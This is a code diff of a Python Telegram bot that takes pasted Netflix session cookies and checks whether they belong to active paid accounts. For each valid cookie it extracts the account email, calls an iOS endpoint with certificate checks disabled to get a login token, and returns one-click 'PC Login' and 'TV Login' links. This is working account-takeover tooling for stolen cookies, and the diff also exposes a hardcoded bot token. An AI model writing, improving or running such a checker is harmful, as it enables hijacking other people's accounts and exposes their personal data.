@@ -1,5 +1,4 @@
 import re
-import json
 import requests
 import urllib3
 import urllib.parse
@@ -11,138 +10,113 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BOT_TOKEN = "8636160046:AAHNuuDo0H2bMYdpL86L8ukdM6TGfcmlKM8"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ================== STRONG COOKIE PARSER ==================
+print("Bot Started...")
+
 def load_cookies(text):
+    print("Received text length:", len(text))
     text = text.strip()
     cookies = {}
 
-    # Very aggressive NetflixId extraction
-    patterns = [
-        r'NetflixId=([^;,\s"]+)',
-        r'"name":"NetflixId","value":"([^"]+)"',
-        r'NetflixId["\']?\s*[:=]\s*["\']?([^"\']+)',
-    ]
+    # Super aggressive extraction
+    match = re.search(r'NetflixId=([^;,\s"]+)', text, re.IGNORECASE)
+    if match:
+        cookies["NetflixId"] = match.group(1)
+        print("Found NetflixId:", cookies["NetflixId"][:30] + "...")
+    else:
+        print("NetflixId not found with first pattern")
 
-    for pattern in patterns:
-        match = re.search(pattern, text, re.IGNORECASE)
+    if not cookies.get("NetflixId"):
+        match = re.search(r'NetflixId["\s:=]+([^"\s,;]+)', text, re.IGNORECASE)
         if match:
             cookies["NetflixId"] = match.group(1)
-            break
-
-    # SecureNetflixId
-    match = re.search(r'SecureNetflixId=([^;,\s"]+)', text, re.IGNORECASE)
-    if match:
-        cookies["SecureNetflixId"] = match.group(1)
+            print("Found with second pattern")
 
     return cookies
 
-# ================== CHECKER ==================
 def check_account(cookies):
     if not cookies.get("NetflixId"):
+        print("No NetflixId in check_account")
         return None
-
-    sess = requests.Session()
-    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
-    for k, v in cookies.items():
-        sess.cookies.set(k, str(v), domain=".netflix.com", path="/")
 
     try:
-        r = sess.get("https://www.netflix.com/account", timeout=25, allow_redirects=True)
-    except:
+        sess = requests.Session()
+        sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+        sess.cookies.set("NetflixId", cookies["NetflixId"], domain=".netflix.com")
+
+        r = sess.get("https://www.netflix.com/account", timeout=20, allow_redirects=True)
+        print("Status Code:", r.status_code)
+
+        if "login" in r.url.lower() or r.status_code in (401, 403):
+            print("Redirected to login")
+            return None
+
+        html = r.text
+        if '"membershipStatus":"CURRENT_MEMBER"' not in html:
+            print("Not a current member")
+            return None
+
+        email = re.search(r'"emailAddress":"([^"]+)"', html)
+        email = email.group(1) if email else "N/A"
+
+        # NFT Token
+        tok = None
+        try:
+            headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={cookies['NetflixId']}"}
+            r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
+            if r2.status_code == 200:
+                data = r2.json()
+                tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
+        except Exception as e:
+            print("NFT Token Error:", e)
+
+        if tok:
+            safe = urllib.parse.quote(tok)
+            login_pc = f"https://netflix.com/?nftoken={safe}"
+        else:
+            login_pc = "N/A"
+
+        return {
+            "email": email,
+            "login_pc": login_pc,
+            "login_tv": "https://www.netflix.com/tv2"
+        }
+    except Exception as e:
+        print("Check Account Error:", str(e))
         return None
 
-    if "login" in r.url.lower() or r.status_code in (401, 403):
-        return None
-
-    html = r.text
-    if '"membershipStatus":"CURRENT_MEMBER"' not in html:
-        return None
-
-    email = _djs(_rx(r'"emailAddress":"([^"]+)"', html))
-    name = _djs(_rx(r'"firstName":"([^"]+)"', html)) or "User"
-    cc = _rx(r'"countryOfSignup":"([A-Z]{2})"', html, "US")
-
-    # NFT Token
-    tok = None
-    try:
-        headers = {"User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)", "Cookie": f"NetflixId={cookies['NetflixId']}"}
-        r2 = requests.get("https://ios.prod.ftl.netflix.com/iosui/user/15.48", 
-                         params={"responseFormat": "json"}, headers=headers, timeout=15, verify=False)
-        if r2.status_code == 200:
-            data = r2.json()
-            tok = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default", {}).get("token")
-    except: pass
-
-    if tok:
-        safe = urllib.parse.quote(tok)
-        login_pc = f"https://netflix.com/?nftoken={safe}"
-        login_phone = f"https://netflix.com/unsupported?nftoken={safe}"
-    else:
-        login_pc = login_phone = "N/A"
-
-    return {
-        "name": name,
-        "email": email or "N/A",
-        "country": cc,
-        "login_pc": login_pc,
-        "login_phone": login_phone,
-        "login_tv": "https://www.netflix.com/tv2"
-    }
-
-def _djs(s):
-    if not s: return ""
-    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
-    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
-    return s.strip()
-
-def _rx(pattern, text, default=""):
-    m = re.search(pattern, text, re.S)
-    return m.group(1) if m else default
-
-# ================== BOT ==================
 @bot.message_handler(commands=['start'])
 def start(message):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add("🔍 Check Cookie")
-    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie", parse_mode="HTML", reply_markup=markup)
+    bot.send_message(message.chat.id, "👋 Paste your Netflix cookie now:")
 
 @bot.message_handler(content_types=['text'])
 def handle_text(message):
-    if message.text == "🔍 Check Cookie":
-        bot.send_message(message.chat.id, "📤 Paste cookie:")
-        return
-
+    print("Received message from:", message.chat.id)
     cookies = load_cookies(message.text)
+
     if not cookies.get("NetflixId"):
-        bot.reply_to(message, "❌ NetflixId not found. Try again.")
+        bot.reply_to(message, "❌ NetflixId not found in your paste.")
         return
 
-    process_cookie(message, cookies)
-
-def process_cookie(message, cookies):
     bot.send_chat_action(message.chat.id, 'typing')
     result = check_account(cookies)
 
     if not result:
-        bot.reply_to(message, "❌ Invalid or expired cookie.")
+        bot.reply_to(message, "❌ Invalid cookie.")
         return
 
     text = f"""
 🎬 <b>✅ NETFLIX ACCOUNT</b>
 
-👤 <b>{result['name']}</b>
 📧 <code>{result['email']}</code>
-🌍 United States ({result['country']})
 
-🔑 <b>NFT Token Login</b>
+🔗 NFT Token Login:
     """
 
     markup = types.InlineKeyboardMarkup()
     markup.add(types.InlineKeyboardButton("🖥 PC Login", url=result["login_pc"]))
-    markup.add(types.InlineKeyboardButton("📱 Phone Login", url=result["login_phone"]))
     markup.add(types.InlineKeyboardButton("📺 TV Login", url=result["login_tv"]))
 
     bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=markup)
 
-print("🚀 Bot is Running...")
+print("Bot is listening...")
 bot.infinity_polling()
